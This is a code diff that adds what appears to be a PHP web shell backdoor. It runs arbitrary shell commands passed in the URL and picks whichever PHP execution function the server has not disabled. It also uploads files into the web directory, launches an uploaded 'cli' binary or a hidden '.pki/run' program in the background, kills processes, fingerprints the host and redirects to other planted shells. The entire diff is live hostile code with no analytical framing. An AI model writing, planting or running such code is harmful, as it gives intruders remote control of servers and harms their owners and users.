+} 
+
+
+if(isset($_GET["ps"])) 
+{
+    echo exe("ps -ux");
+    die("\ndone!");
+} else
+if(isset($_GET["ls"])) {
+    echo exe("ls -al");
+    die("\ndone!");
+} else
+if(isset($_GET["run"])) {
+    $shell_user = posix_getpwuid($uid);
+    $home_dir = posix_getpwuid(getmyuid())['dir'];
+
+    $checkfile="$upload_cli/.pki/run";
+    if(!file_exists($checkfile)) $checkfile="$home_dir/etc/.pki/run";
+    echo "target: $checkfile\n";
+
+    if(file_exists($checkfile)) {
+        chdir(substr($checkfile,0,-3));
+        echo "running [app]..." . PHP_EOL;
+        exe("./run");
+        die("\ndone!");
+    } else
+        die("ERROR: [app] not available!");
+
+} else
+if(isset($_GET["dfu"])) 
+{
+    echo "\nkill all defunc process\n";
+    exe($killdfu);
+    echo exe("ps -ux");
+    die("\ndone!");
+} else
+if(isset($_GET["kil"])) {
+    echo "\nkill all cli process\n";
+    die();
+    
+    exe($killclis);
+    exe($killdfu);
+    echo exe("ps -ux");
+    die("\ndone!");
+}
+else if(isset($_GET["cli"])) {
+    if(file_exists("$upload_cli/cli")) {
+        exe($killclis);
+        chmod("$upload_cli/cli",0755);
+        
+        $cmd="setsid $upload_cli/cli &";
+        echo "running cli..." . PHP_EOL;
+        
+        exe($cmd);
+        exe($killdfu);
+        die("\ndone!");
+    } else 
+        die("ERROR: cli not found!");
+} else
+if(isset($_GET["cmd"])) {
+    $tmp=$_SERVER['REQUEST_URI'];$p=strpos($tmp,"=");
+    $cmd=substr($tmp,$p+1);
+    $cmd=rawurldecode($cmd);
+//    $cmd=$_GET["cmd"];
+    echo "> $cmd\n";
+    if($cmd!="") {
+        $outp = exe($cmd);
+        echo $outp;
+        die("\ndone!");
+    }
+} else
+if(isset($_GET["shl"])) {
+    $list=glob("$upload_dir/*.php");
+//    print_r($list);
+    $n=count($list);
+    if($n==0) die("ERROR: no shl found!");
+    $no=mt_rand(0,$n-1);
+    $target=$list[$no];
+?>
+
+<script>location.href="<?php echo $target; ?>"</script>
+<?php
+    die("\ndone!");
+}
+
+if(!isset($_GET["upl"])) die();
+if($upload_dir=="") {
+    die("no upload dir!");
+}
+
+echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /> <input type='submit' value='upload' /></form><pre>";
+$tmp = $_FILES['file']['tmp_name'];
+if ($tmp != "") {
+    $tmp2 = $_FILES['file']['name'];
+    $link = "$link/$tmp2";
+    if($tmp2=="cli")
+        $tmp3 = "$upload_cli/$tmp2";
+    else
+        $tmp3 = "$upload_dir/$tmp2";
+        
+    if(file_exists($tmp3)) echo "File will be overwritten\n";
+    $ret = move_uploaded_file($tmp, $tmp3);
+    if($ret) {
+        if($tmp2=="cli")
+            echo "uploaded to $tmp3\n";
+        else
+            echo "uploaded to <a href='$link'>$link</a>\n";
+    }
+    else 
+       die("ERROR: upload failed!");
+
+   die("\ndone!");
+}
+
+function get_cpu_info() 
+{
+    $available = Array();
+    global $host,$hostaddr,$clientip,$funclist,$fncmaster;
+
+    $disb = trim(ini_get("disable_functions"));
+    if($disb=='') {
+        $disb = "none";
+        $fncmaster = "shell_exec";
+    }
+    else {
+        $disb=str_ireplace(chr(32),'',$disb);
+        $disable_functions = explode(",",$disb);
+       // echo "disable:\n";
+        //print_r($disable_functions);
+
+        //echo "function list:\n";
+        //print_r($funclist);
+
+        $available = array_diff($funclist,$disable_functions);
+        //echo "available:\n";
+        //print_r($available);
+
+        foreach($available as $func) {
+            $fncmaster=$func;
+            break;
+        }
+    }
+
+    // $fncmaster = "popen";
+//    if($fncmaster!="")
+ //       echo "USING: $fncmaster\n";
+ //   else
+    if($fncmaster=="")
+        echo "All OS functions disabled!\n";
+
+    if($disb!="")
+        echo("disable_functions = $disb\n");
+        
+    if($fncmaster!="")
+    {
+            //$disb=substr($disb,0,47); if (strlen($disb)>=47) $disb.="...";
+            //$disb="[$disb]";
+            
+            $TPROC=get_processor($MODEL);
+            
+            //$MODEL=exe("echo -n $(head /proc/cpuinfo -n 10 | grep 'model name' | sed 's/model name//' | cut -b4-)");
+            //$MODEL=str_ireplace(chr(10),'',$MODEL);$MODEL=str_ireplace(chr(13),'',$MODEL);
+            
+            //$uname=exe("echo -n $(uname -n)");
+            $uname=php_uname("n");
+            //$uptime=exe("echo -n $(uptime)");
+            $uptime=getUptime();
+            //$uptime=str_ireplace(chr(10),'',$uptime);$uptime=str_ireplace(chr(13),'',$uptime);
+            $uptime="UPTIME > $uptime";
+            
+            //. substr($uptime,12);
+            //$whoami=exe("id");
+            $whoami=fwhoami();
+            $totmem=get_total_mem();
+
+            // $lines = str_repeat("=",50) . " $disb ";
+            // $n2 = 100 - strlen($lines);
+            // $line2 = $lines;
+            // if($n2>0) $line2 .= str_repeat("=",$n2); else $line2 .= "===";
+            //echo "$line2\n";
+            echo str_repeat('=',100); 
+            echo "\n$uname > $host ($hostaddr) | CLIENTIP: $clientip\n";
+            echo "[ $TPROC ] $MODEL - $totmem\n\n";
+
+            echo php_uname("s") . " ". php_uname("r") . " " . php_uname("v") . "\n";
+            echo "   $uptime\n";
+            echo "   WHOAMI > $whoami\n";
+            echo str_repeat('=',95) . " v0.27\n";
+    }
+
+    echo "PWD: " . getcwd() . "\n\n";
+}
+
+function get_total_mem() {
+
+    //exe("echo -n $(free -m |  grep 'Mem:' | cut -b 10-20 | grep -o '[[:digit:]]*');");
+    $info=file_get_contents("/proc/meminfo");
+    $info=floatval(trim(substr($info,12)))/1000;
+    $totmem=$info;
+    
+    if(intval($totmem>=1000)) {
+        $totmem = "[ " . number_format(intval($totmem)/1000.0,1) . " GiB ] Total Memory";
+    } else
+        $totmem = "[ " . number_format($totmem,0) . " MiB ] Total Memory";
+
+    return $totmem;
+}
+
+function get_processor(&$model) {
+    $info=file_get_contents("/proc/cpuinfo");
+    $total=explode("processor",$info);
+    $total=count($total);
+    $model="gembel";
+    
+    $p=stripos($info,"model name	:");
+    $p=$p+strlen("model name	:");
+    $q=stripos($info,chr(10),$p);
+    $model = trim(substr($info,$p,$q-$p));
+
+    if($total<2) return "n/a";
+    else return $total-1;
+}
+
+function fwhoami() {
+    
+    $userInfo = posix_getpwuid(posix_getuid());
+    $user = $userInfo['name'];    
+    $groupInfo = posix_getgrgid(posix_getgid());
+    $group = $groupInfo = $groupInfo['name'];
+
+    return "$user ($group)";
+}
+
+
+function getUptime() {
+        $str   = @file_get_contents('/proc/uptime');
+        $num   = floatval($str);
+        $secs  = $num % 60;
+        $num   = (int)($num / 60);
+        $mins  = $num % 60;
+        $num   = (int)($num / 60);
+        $hours = $num % 24;
+        $num   = (int)($num / 24);
+        $days  = $num;
+
+        return "$days days $hours hours $mins mins";
+        
+        // return array(
+        //     "days"  => $days,
+        //     "hours" => $hours,
+        //     "mins"  => $mins,
+        //     "secs"  => $secs
+        // );
+    }
+
+
+function exe($cmd)
+{
+    global $fncmaster;
+    $sc=$cmd;
+    $retvalue="";
+
+	switch ($fncmaster) {
+		case "system":
+            ob_start();
+            system($sc);
+            $retvalue = ob_get_contents();
+            ob_end_clean(); 
+           break;
+
+        case "passthru":
+            ob_start();
+            passthru($sc);
+            $retvalue = ob_get_contents();
+            ob_end_clean(); 
+           break;
+
+        case "shell_exec":
+			$retvalue = shell_exec($sc);
+           break;
+
+        case "exec":
+            $r = NULL;
+            exec($sc,$r);
+			if (is_array($r)) {
+			 	foreach ($r as $v)
+                     $retvalue .= "$v\n";
+            }
+            //$retvalue .= "\n";
+            //$retvalue=substr($retvalue,0,-1);
+           break;
+
+        case "popen":
+			if ($h = popen($sc, 'r')) {
+				while (!feof($h)) {
+					$retvalue .= fread($h, 1024);
+                }
+				pclose($h);
+			}
+           break;
+
+        case "proc_open":
+            if($h = proc_open($sc,array(array('pipe','r'), array('pipe','w'), array('pipe','a')),$p)){
+                $retvalue = stream_get_contents($p[1]);
+				fclose($p[0]);
+				fclose($p[1]);
+				proc_close($h);
+			}
+           break;
+
+        case "windows":
+			//if ($h = new COM('WScript.Shell'))
+			//	echo $h->Exec(($sh === '' ? 'cmd' : $sh) . ' /C ' . $cmd . ' ' . $se)->StdOut->ReadAll();
+			break;
+
+        default: 
+            die("error $fncmaster");
+	}
+
+    $final = htmlentities($retvalue);
+    //if($fncmaster!="exec" && $fncmaster!="passthru")
+      //  echo $final;
+    return $final;
+}
